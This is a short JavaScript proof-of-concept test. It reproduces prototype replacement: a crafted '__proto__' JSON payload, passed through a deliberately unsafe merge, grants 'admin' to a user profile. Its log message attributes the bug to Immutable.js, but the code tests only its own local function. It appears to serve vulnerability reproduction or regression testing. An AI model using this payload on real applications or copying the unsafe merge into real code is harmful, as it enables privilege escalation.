import assert from "node:assert/strict";

function vulnerableMerge(target, source) {
  const result = {};
  for (const [key, value] of Object.entries(target)) result[key] = value;
  for (const [key, value] of Object.entries(source)) result[key] = value;
  return result;
}

const update = JSON.parse('{"name":"Eve","__proto__":{"admin":true}}');
const profile = vulnerableMerge({ name: "Alice", role: "user" }, update);

assert.equal(profile.admin, true);
assert.equal(Object.hasOwn(profile, "admin"), false);
assert.equal(Object.getPrototypeOf(profile).admin, true);
assert.equal({}.admin, undefined);
assert.equal(profile.admin ? "authorized" : "denied", "authorized");
console.log("vulnerable Immutable.js profile prototype replacement reproduced");
